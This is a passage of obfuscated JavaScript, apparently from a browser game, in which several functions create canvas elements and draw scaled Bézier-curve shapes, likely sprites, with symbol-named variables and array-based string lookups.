			Δ.bezierCurveTo(ᐃ * 65, ᐃ * 226.79999542236328, ᐃ * 71, 229.79999542236328 * ᐃ, ᐃ * 76, 225.79999542236328 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 90, ᐃ * 224.79999542236328, ᐃ * 89, 232.79999542236328 * ᐃ, ᐃ * 90, 243.79999542236328 * ᐃ);
			Δ.bezierCurveTo(95 * ᐃ, 253.79999542236328 * ᐃ, 99 * ᐃ, 249.79999542236328 * ᐃ, ᐃ * 100, 229.79999542236328 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 102, 213.79999542236328 * ᐃ, 98 * ᐃ, 214.79999542236328 * ᐃ, ᐃ * 90, 205.79999542236328 * ᐃ);
			Δ.bezierCurveTo(82 * ᐃ, 201.79999542236328 * ᐃ, ᐃ * 82, ᐃ * 185.79999542236328, ᐃ * 82, 114.79999542236328 * ᐃ);
			Δ.bezierCurveTo(80 * ᐃ, 73 * ᐃ, ᐃ * 82, 68 * ᐃ, 93 * ᐃ, ᐃ * 53);
			Δ.bezierCurveTo(ᐃ * 98, 37 * ᐃ, ᐃ * 65, ᐃ * 14, 74 * ᐃ, ᐃ * 33);
			Δ.bezierCurveTo(ᐃ * 82, ᐃ * 56, ᐃ * 77, ᐃ * 52, 69 * ᐃ, 54 * ᐃ);
			Δ.bezierCurveTo(55 * ᐃ, ᐃ * 57, ᐃ * 57, 53 * ᐃ, 54 * ᐃ, ᐃ * 39);
			Δ.bezierCurveTo(ᐃ * 46, 20 * ᐃ, ᐃ * 37, 61 * ᐃ, ᐃ * 50, 68 * ᐃ);
			Δ.bezierCurveTo(65 * ᐃ, 81 * ᐃ, 60 * ᐃ, ᐃ * 89, ᐃ * 62, 102 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔ], Ⲇᐃ[2], ᐃ * ᐃⲆⲆⲆ);
			return Ⲇⵠ
		}

		function ᐃΔΔⲆᐃⵠⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 465;
			Ⲇⵠ.height = ᐃ * 405;
			Δ.globalAlpha = ΔᐃⲆⵠ;
			Δ.translate(6 * ᐃ, ᐃ * 0);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(39.000030517578125 * ᐃ, 162.03977966308594 * ᐃ);
			Δ.bezierCurveTo(125.00003051757812 * ᐃ, ᐃ * 84.03977966308594, 108.50003051757812 * ᐃ, ᐃ * 115.03977966308594, ᐃ * 178.00003051757812, 68.03977966308594 * ᐃ);
			Δ.bezierCurveTo(299.0000305175781 * ᐃ, ᐃ * 146.53977966308594, 299.0000305175781 * ᐃ, 146.53977966308594 * ᐃ, 420.0000305175781 * ᐃ, ᐃ * 225.03977966308594);
			Δ.bezierCurveTo(ᐃ * 400.0000305175781, ᐃ * 288.53977966308594, ᐃ * 400.0000305175781, 288.53977966308594 * ᐃ, 380.0000305175781 * ᐃ, 352.03977966308594 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 216.50003051757812, ᐃ * 345.53977966308594, 216.50003051757812 * ᐃ, 345.53977966308594 * ᐃ, ᐃ * 53.000030517578125, ᐃ * 339.03977966308594);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃⲆ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(ᐃ * 23.000030517578125, ᐃ * 306.94886779785156);
			Δ.bezierCurveTo(5.000030517578125 * ᐃ, ᐃ * 275.94886779785156, ᐃ * 6.000030517578125, ᐃ * 201.94886779785156, 14.000030517578125 * ᐃ, ᐃ * 150.94886779785156);
			Δ.bezierCurveTo(ᐃ * 40.000030517578125, ᐃ * 34.94886779785156, ᐃ * 157.00003051757812, ᐃ * 14.948867797851562, ᐃ * 199.00003051757812, 11.948867797851562 * ᐃ);
			Δ.bezierCurveTo(331.0000305175781 * ᐃ, ᐃ * .9488677978515625, 409.0000305175781 * ᐃ, 61.94886779785156 * ᐃ, 428.0000305175781 * ᐃ, 133.94886779785156 * ᐃ);
			Δ.bezierCurveTo(445.0000305175781 * ᐃ, ᐃ * 207.94886779785156, 439.0000305175781 * ᐃ, ᐃ * 274.94886779785156, 426.0000305175781 * ᐃ, ᐃ * 342.94886779785156);
			Δ.bezierCurveTo(ᐃ * 355.0000305175781, ᐃ * 207.94886779785156, ᐃ * 345.0000305175781, 208.94886779785156 * ᐃ, 333.0000305175781 * ᐃ, 202.94886779785156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 262.0000305175781, ᐃ * 143.94886779785156, ᐃ * 236.00003051757812, 148.94886779785156 * ᐃ, 189.00003051757812 * ᐃ, ᐃ * 162.94886779785156);
			Δ.bezierCurveTo(ᐃ * 82.00003051757812, 190.94886779785156 * ᐃ, ᐃ * 78.00003051757812, ᐃ * 235.94886779785156, ᐃ * 62.000030517578125, 279.94886779785156 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠⵠ], Ⲇᐃ[1], ᐃ * 20);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 17.000030517578125, ᐃ * 149.94886779785156);
			Δ.bezierCurveTo(ᐃ * 76.00003051757812, ᐃ * 67.94886779785156, 177.00003051757812 * ᐃ, ᐃ * 40.94886779785156, 232.00003051757812 * ᐃ, 45.94886779785156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 316.0000305175781, ᐃ * 46.94886779785156, ᐃ * 359.0000305175781, 74.94886779785156 * ᐃ, 428.0000305175781 * ᐃ, 145.94886779785156 * ᐃ);
			Δ.bezierCurveTo(414.0000305175781 * ᐃ, 73.94886779785156 * ᐃ, 386.0000305175781 * ᐃ, 68.94886779785156 * ᐃ, ᐃ * 359.0000305175781, 43.94886779785156 * ᐃ);
			Δ.bezierCurveTo(295.0000305175781 * ᐃ, ᐃ * 5.9488677978515625, ᐃ * 239.00003051757812, 10.948867797851562 * ᐃ, 207.00003051757812 * ᐃ, 10.948867797851562 * ᐃ);
			Δ.bezierCurveTo(121.00003051757812 * ᐃ, 20.948867797851562 * ᐃ, ᐃ * 104.00003051757812, 34.94886779785156 * ᐃ, 45.000030517578125 * ᐃ, 84.94886779785156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 14.000030517578125, 128.94886779785156 * ᐃ, 18.000030517578125 * ᐃ, ᐃ * 142.94886779785156, ᐃ * 16.000030517578125, 151.94886779785156 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⵠᐃΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔᐃΔⲆ];
			Δ.moveTo(23.000030517578125 * ᐃ, 306.94886779785156 * ᐃ);
			Δ.bezierCurveTo(5.000030517578125 * ᐃ, 275.94886779785156 * ᐃ, ᐃ * 6.000030517578125, 201.94886779785156 * ᐃ, ᐃ * 14.000030517578125, 150.94886779785156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 40.000030517578125, ᐃ * 34.94886779785156, ᐃ * 157.00003051757812, ᐃ * 14.948867797851562, 199.00003051757812 * ᐃ, ᐃ * 11.948867797851562);
			Δ.bezierCurveTo(331.0000305175781 * ᐃ, .9488677978515625 * ᐃ, 409.0000305175781 * ᐃ, 61.94886779785156 * ᐃ, ᐃ * 428.0000305175781, 133.94886779785156 * ᐃ);
			Δ.bezierCurveTo(445.0000305175781 * ᐃ, ᐃ * 207.94886779785156, 439.0000305175781 * ᐃ, 274.94886779785156 * ᐃ, 426.0000305175781 * ᐃ, 342.94886779785156 * ᐃ);
			Δ.bezierCurveTo(355.0000305175781 * ᐃ, ᐃ * 207.94886779785156, 345.0000305175781 * ᐃ, 208.94886779785156 * ᐃ, ᐃ * 333.0000305175781, 202.94886779785156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 262.0000305175781, ᐃ * 143.94886779785156, 236.00003051757812 * ᐃ, 148.94886779785156 * ᐃ, 189.00003051757812 * ᐃ, ᐃ * 162.94886779785156);
			Δ.bezierCurveTo(82.00003051757812 * ᐃ, ᐃ * 190.94886779785156, 78.00003051757812 * ᐃ, 235.94886779785156 * ᐃ, ᐃ * 62.000030517578125, ᐃ * 279.94886779785156);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[1], ᐃ * ⵠᐃᐃⵠΔⵠΔ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(60.000030517578125 * ᐃ, 288.03977966308594 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 183.00003051757812, 320.03977966308594 * ᐃ, ᐃ * 342.0000305175781, 306.03977966308594 * ᐃ, ᐃ * 399.0000305175781, ᐃ * 286.03977966308594);
			Δ.bezierCurveTo(ᐃ * 420.0000305175781, ᐃ * 345.03977966308594, ᐃ * 410.0000305175781, ᐃ * 335.03977966308594, ᐃ * 415.0000305175781, 362.03977966308594 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 351.0000305175781, ᐃ * 384.03977966308594, ᐃ * 299.0000305175781, 389.03977966308594 * ᐃ, 215.00003051757812 * ᐃ, ᐃ * 391.03977966308594);
			Δ.bezierCurveTo(128.00003051757812 * ᐃ, ᐃ * 388.03977966308594, 69.00003051757812 * ᐃ, 373.03977966308594 * ᐃ, 39.000030517578125 * ᐃ, 359.03977966308594 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ⵠΔΔ], ᐃ * 13);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(47.000030517578125 * ᐃ, ᐃ * 327.03977966308594);
			Δ.bezierCurveTo(203.00003051757812 * ᐃ, 377.03977966308594 * ᐃ, ᐃ * 331.0000305175781, 349.03977966308594 * ᐃ, 410.0000305175781 * ᐃ, 330.03977966308594 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ], Ⲇᐃ[1], ⵠᐃΔᐃᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 9.000030517578125, ᐃ * 339.1306915283203);
			Δ.bezierCurveTo(ᐃ * 2.000030517578125, ᐃ * 280.1306915283203, ᐃ * 30.000030517578125, 219.1306915283203 * ᐃ, 85.00003051757812 * ᐃ, ᐃ * 167.1306915283203);
			Δ.bezierCurveTo(174.00003051757812 * ᐃ, 82.13069152832031 * ᐃ, 241.00003051757812 * ᐃ, ᐃ * 101.13069152832031, ᐃ * 284.0000305175781, 115.13069152832031 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 333.0000305175781, ᐃ * 134.1306915283203, 376.0000305175781 * ᐃ, 177.1306915283203 * ᐃ, ᐃ * 410.0000305175781, ᐃ * 247.1306915283203);
			Δ.bezierCurveTo(ᐃ * 439.0000305175781, ᐃ * 300.1306915283203, ᐃ * 442.0000305175781, 346.1306915283203 * ᐃ, ᐃ * 430.0000305175781, 363.1306915283203 * ᐃ);
			Δ.bezierCurveTo(418.0000305175781 * ᐃ, 366.1306915283203 * ᐃ, 395.0000305175781 * ᐃ, ᐃ * 295.1306915283203, ᐃ * 355.0000305175781, 223.1306915283203 * ᐃ);
			Δ.bezierCurveTo(299.0000305175781 * ᐃ, ᐃ * 156.1306915283203, ᐃ * 262.0000305175781, ᐃ * 155.1306915283203, ᐃ * 215.00003051757812, 159.1306915283203 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 133.00003051757812, 171.1306915283203 * ᐃ, 120.00003051757812 * ᐃ, ᐃ * 193.1306915283203, 96.00003051757812 * ᐃ, 221.1306915283203 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 49.000030517578125, 262.1306915283203 * ᐃ, 47.000030517578125 * ᐃ, ᐃ * 306.1306915283203, ᐃ * 38.000030517578125, 336.1306915283203 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 30.000030517578125, ᐃ * 349.1306915283203, 30.000030517578125 * ᐃ, 349.1306915283203 * ᐃ, 22.000030517578125 * ᐃ, 362.1306915283203 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[1], 20 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 228.00003051757812, ᐃ * 128.03977966308594);
			Δ.bezierCurveTo(315.0000305175781 * ᐃ, ᐃ * 131.03977966308594, ᐃ * 349.0000305175781, ᐃ * 178.03977966308594, 386.0000305175781 * ᐃ, 234.03977966308594 * ᐃ);
			Δ.bezierCurveTo(444.0000305175781 * ᐃ, ᐃ * 329.03977966308594, ᐃ * 446.0000305175781, 354.03977966308594 * ᐃ, 427.0000305175781 * ᐃ, 373.03977966308594 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 389.0000305175781, ᐃ * 389.03977966308594, ᐃ * 399.0000305175781, 329.03977966308594 * ᐃ, 361.0000305175781 * ᐃ, 277.03977966308594 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 306.0000305175781, ᐃ * 191.03977966308594, 266.0000305175781 * ᐃ, ᐃ * 183.03977966308594, 220.00003051757812 * ᐃ, 181.03977966308594 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 138.00003051757812, 184.03977966308594 * ᐃ, 123.00003051757812 * ᐃ, ᐃ * 212.03977966308594, ᐃ * 89.00003051757812, ᐃ * 271.03977966308594);
			Δ.bezierCurveTo(ᐃ * 52.000030517578125, 349.03977966308594 * ᐃ, 68.00003051757812 * ᐃ, 364.03977966308594 * ᐃ, 33.000030517578125 * ᐃ, ᐃ * 369.03977966308594);
			Δ.bezierCurveTo(ᐃ * 6.000030517578125, 366.03977966308594 * ᐃ, ᐃ * 5.000030517578125, ᐃ * 341.03977966308594, 26.000030517578125 * ᐃ, 288.03977966308594 * ᐃ);
			Δ.bezierCurveTo(60.000030517578125 * ᐃ, 207.03977966308594 * ᐃ, 100.00003051757812 * ᐃ, 180.03977966308594 * ᐃ, ᐃ * 113.00003051757812, 170.03977966308594 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 159.00003051757812, ᐃ * 132.03977966308594, 196.00003051757812 * ᐃ, 133.03977966308594 * ᐃ, 226.00003051757812 * ᐃ, 129.03977966308594 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔΔΔ], ᐃ * 20);
			return Ⲇⵠ
		}

		function ΔⵠΔΔᐃⲆⵠ(ᐃ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 573;
			Ⲇⵠ.height = 350 * ᐃ;
			1 == ⵠᐃ && (Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ], Δ.moveTo(ᐃ * 336, ᐃ * 72), Δ.bezierCurveTo(366 * ᐃ, 15 * ᐃ, 426 * ᐃ, ᐃ * 36, 497 * ᐃ, ᐃ * 83), Δ.bezierCurveTo(522 * ᐃ, 85 * ᐃ, ᐃ * 522, ᐃ * 85, 547 * ᐃ, 87 * ᐃ), Δ.bezierCurveTo(476.5 * ᐃ, 205 * ᐃ, ᐃ * 476.5, 205 * ᐃ, 406 * ᐃ, 323 * ᐃ), Δ.bezierCurveTo(ᐃ * 297.5, 319 * ᐃ, ᐃ * 297.5, 319 * ᐃ, 189 * ᐃ, 315 * ᐃ), Δ.bezierCurveTo(105.5 * ᐃ, 279 * ᐃ, ᐃ * 105.5, ᐃ * 279, ᐃ * 22, ᐃ * 243), Δ.bezierCurveTo(92 * ᐃ, ᐃ * 140, ᐃ * 92, 140 * ᐃ, ᐃ * 162, 37 * ᐃ), Δ.bezierCurveTo(ᐃ * 173, ᐃ * 39, ᐃ * 173, ᐃ * 39, ᐃ * 184, ᐃ * 41), Δ.bezierCurveTo(185 * ᐃ, 38.5 * ᐃ, 185 * ᐃ, 38.5 * ᐃ, ᐃ * 186, 36 * ᐃ), Δ.bezierCurveTo(ᐃ * 323, ᐃ * ᐃΔⲆᐃⲆᐃⲆ, ᐃ * 322, 25 * ᐃ, ᐃ * 337, 74 * ᐃ), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[Ⲇⵠⵠⵠ], Ⲇᐃ[ⵠᐃᐃⲆ], 35 * ᐃ));
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(168 * ᐃ, ᐃ * 42);
			Δ.bezierCurveTo(ᐃ * ⲆᐃᐃΔᐃᐃⵠ, ᐃ * 60, ᐃ * ΔⵠⲆᐃᐃΔᐃ, ᐃ * 60, ᐃ * 342, 78 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 443, 81.5 * ᐃ, 443 * ᐃ, ᐃ * 81.5, ᐃ * 544, 85 * ᐃ);
			Δ.bezierCurveTo(475 * ᐃ, ᐃ * 204.5, 475 * ᐃ, 204.5 * ᐃ, 406 * ᐃ, ᐃ * 324);
			Δ.bezierCurveTo(ᐃ * 297.5, 320 * ᐃ, 297.5 * ᐃ, ᐃ * 320, 189 * ᐃ, ᐃ * 316);
			Δ.bezierCurveTo(105.5 * ᐃ, 279 * ᐃ, ᐃ * 105.5, ᐃ * 279, 22 * ᐃ, 242 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆⲆ], Ⲇᐃ[Ⲇᐃⵠ], ΔᐃⵠⲆⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(188 * ᐃ, 41 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 308, ᐃ * 15, ᐃ * 325, ᐃ * ᐃᐃΔⲆⲆΔⲆ, ᐃ * 337, 66 * ᐃ);
			Δ.bezierCurveTo(191 * ᐃ, 305 * ᐃ, 196 * ᐃ, 286 * ᐃ, 184 * ᐃ, 307 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 175, 250 * ᐃ, ᐃ * 90, ᐃ * 254, ᐃ * 52, 241 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃᐃⵠ], Ⲇᐃ[3], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 336, 71 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 375, ᐃ * ᐃⵠᐃᐃⵠ, ᐃ * 429, ᐃ * 50, ᐃ * 518, 92 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 455, 199.5 * ᐃ, ᐃ * 455, ᐃ * 199.5, ᐃ * 392, ᐃ * 307);
			Δ.bezierCurveTo(227 * ᐃ, 301 * ᐃ, ᐃ * 261, 255 * ᐃ, 188 * ᐃ, ᐃ * 308);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⵠΔΔ], Ⲇᐃ[ΔⲆΔᐃ], ᐃ * ⵠⲆⲆⲆᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(357 * ᐃ, 76 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 390, 67 * ᐃ, ᐃ * 414, 86 * ᐃ, 435 * ᐃ, ᐃ * 104);
			Δ.bezierCurveTo(417 * ᐃ, ᐃ * 135, 417 * ᐃ, ᐃ * 135, ᐃ * 399, 166 * ᐃ);
			Δ.bezierCurveTo(352 * ᐃ, ᐃ * 140, 345 * ᐃ, 139 * ᐃ, 319 * ᐃ, 142 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[3], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 309, 168 * ᐃ);
			Δ.bezierCurveTo(345 * ᐃ, ᐃ * 163, ᐃ * 372, 180 * ᐃ, ᐃ * 412, ᐃ * 203);
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ᐃⲆΔⵠ], ᐃ * ΔᐃΔΔΔΔⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(ᐃ * 263, ᐃ * 54);
			Δ.bezierCurveTo(ᐃ * 305, ᐃ * 44, 307 * ᐃ, ᐃ * 51, 311 * ᐃ, ᐃ * 64);
			Δ.bezierCurveTo(ᐃ * 270.5, ᐃ * 129.5, 270.5 * ᐃ, 129.5 * ᐃ, 230 * ᐃ, 195 * ᐃ);
			Δ.bezierCurveTo(221 * ᐃ, ᐃ * 175, ᐃ * 203, 171 * ᐃ, ᐃ * 186, 172 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠΔ], Ⲇᐃ[Δⵠᐃⵠ], 12 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(ᐃ * 292, ᐃ * 198);
			Δ.bezierCurveTo(ᐃ * 328, 191 * ᐃ, 364 * ᐃ, ᐃ * 211, ᐃ * 401, ᐃ * 237);
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[3], ᐃⲆⲆΔⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(245 * ᐃ, ᐃ * 68);
			Δ.bezierCurveTo(ᐃ * 210, 72 * ᐃ, ᐃ * 210, ᐃ * 72, ᐃ * 189, 69 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ᐃⲆᐃᐃ], 12 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 222, ᐃ * 96);
			Δ.bezierCurveTo(196 * ᐃ, 97 * ᐃ, 193 * ᐃ, ᐃ * 97, 177 * ᐃ, 92 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ᐃᐃⲆⲆ], ᐃ * ⲆⲆΔΔⵠΔⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 207, 124 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 179, 123 * ᐃ, 177 * ᐃ, ᐃ * 124, 161 * ᐃ, ᐃ * 119);
			ΔⲆ(Δ, Ⲇᐃ[Δⵠⵠⵠ], Ⲇᐃ[ᐃⲆΔⵠ], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 115, ᐃ * 183);
			Δ.bezierCurveTo(ᐃ * 184, 185 * ᐃ, ᐃ * 203, ᐃ * 198, ᐃ * 219, 221 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[3], 12 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 98, ᐃ * 213);
			Δ.bezierCurveTo(ᐃ * 161, 214 * ᐃ, 193 * ᐃ, 227 * ᐃ, 201 * ᐃ, ᐃ * 249);
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃᐃⵠ], Ⲇᐃ[ⲆⲆΔⲆ], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * 399, 257 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 287, 215 * ᐃ, ᐃ * 280, ᐃ * 215, ᐃ * 263, 222 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 253, 238 * ᐃ, ᐃ * 247, 245 * ᐃ, 243 * ᐃ, 254 * ᐃ);
			Δ.bezierCurveTo(267 * ᐃ, ᐃ * 236, ᐃ * 292, ᐃ * 263, ᐃ * 377, ᐃ * 284);
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[3], 12 * ᐃ);
			return Ⲇⵠ
		}

		function ⵠⵠΔⵠⵠΔᐃΔⵠ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 316;
			Ⲇⵠ.height = 365 * ᐃ;
			Δ.save();
			Δ.translate(156.07142639160156 * ᐃ, 51.81248474121094 * ᐃ);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, ᐃ * -21.5, -34 * ᐃ, ᐃ * 43, ᐃ * 68, 8 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃΔΔ], Ⲇᐃ[Δⵠᐃ], ᐃ * 15);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(126.57142639160156 * ᐃ, 67.38392639160156 * ᐃ);
			Δ.bezierCurveTo(126.57142639160156 * ᐃ, 57.38392639160156 * ᐃ, ᐃ * 132.57142639160156, ᐃ * 54.38392639160156, ᐃ * 140.57142639160156, 54.38392639160156 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 177.57142639160156, ᐃ * 55.38392639160156, ᐃ * 158.07142639160156, 54.38392639160156 * ᐃ, 175.57142639160156 * ᐃ, 54.38392639160156 * ᐃ);
			Δ.bezierCurveTo(185.57142639160156 * ᐃ, 56.38392639160156 * ᐃ, ᐃ * 185.57142639160156, ᐃ * 57.38392639160156, ᐃ * 184.57142639160156, ᐃ * 66.38392639160156);
			Δ.bezierCurveTo(ᐃ * 184.57142639160156, ᐃ * 78.38392639160156, 184.57142639160156 * ᐃ, 89.38392639160156 * ᐃ, 184.57142639160156 * ᐃ, ᐃ * 90.38392639160156);
			Δ.bezierCurveTo(ᐃ * 177.57142639160156, 107.38392639160156 * ᐃ, ᐃ * 180.57142639160156, ᐃ * 112.38392639160156, 189.57142639160156 * ᐃ, 116.38392639160156 * ᐃ);
			Δ.bezierCurveTo(212.57142639160156 * ᐃ, ᐃ * 127.38392639160156, 212.57142639160156 * ᐃ, ᐃ * 132.38392639160156, 211.57142639160156 * ᐃ, ᐃ * 150.38392639160156);
			Δ.bezierCurveTo(ᐃ * 211.57142639160156, 227.59821128845215 * ᐃ, 211.57142639160156 * ᐃ, ᐃ * 227.59821128845215, 211.57142639160156 * ᐃ, 304.81249618530273 * ᐃ);
			Δ.bezierCurveTo(212.57142639160156 * ᐃ, ᐃ * 328.81249618530273, ᐃ * 209.57142639160156, 330.81249618530273 * ᐃ, ᐃ * 188.57142639160156, 333.81249618530273 * ᐃ);
			Δ.bezierCurveTo(155.07142639160156 * ᐃ, 333.31249618530273 * ᐃ, ᐃ * 155.07142639160156, ᐃ * 333.31249618530273, 121.57142639160156 * ᐃ, 332.81249618530273 * ᐃ);
			Δ.bezierCurveTo(104.57142639160156 * ᐃ, ᐃ * 327.81249618530273, 105.57142639160156 * ᐃ, 328.81249618530273 * ᐃ, ᐃ * 104.57142639160156, 312.81249618530273 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 104.57142639160156, 228.16963958740234 * ᐃ, 104.57142639160156 * ᐃ, 228.16963958740234 * ᐃ, ᐃ * 104.57142639160156, ᐃ * 143.52678298950195);
			Δ.bezierCurveTo(106.57142639160156 * ᐃ, ᐃ * 124.52678298950195, ᐃ * 110.57142639160156, ᐃ * 123.52678298950195, 123.57142639160156 * ᐃ, ᐃ * 116.52678298950195);
			Δ.bezierCurveTo(ᐃ * 136.57142639160156, 110.52678298950195 * ᐃ, ᐃ * 130.57142639160156, 106.52678298950195 * ᐃ, ᐃ * 126.57142639160156, ᐃ * 98.52678298950195);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ], Ⲇᐃ[0], 15 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(125.57142639160156 * ᐃ, 156.66963958740234 * ᐃ);
			Δ.bezierCurveTo(125.57142639160156 * ᐃ, 182.66963958740234 * ᐃ, ᐃ * 125.57142639160156, 182.66963958740234 * ᐃ, ᐃ * 125.57142639160156, ᐃ * 208.66963958740234);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆ], Ⲇᐃ[0], ᐃ * ⵠⵠⵠᐃΔⲆⵠ);
			return Ⲇⵠ
		}

